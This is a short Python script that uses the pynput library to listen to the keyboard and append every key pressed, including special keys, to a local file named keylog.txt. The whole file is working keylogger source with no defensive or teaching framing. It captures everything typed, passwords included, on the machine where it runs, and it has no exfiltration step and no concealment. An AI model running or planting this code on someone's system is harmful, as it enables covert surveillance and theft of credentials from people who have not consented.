from pynput.keyboard import Listener

# Function to log the keys pressed
def on_press(key):
    try:
        # Record the character pressed
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key}\n")

# Set up the listener for the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
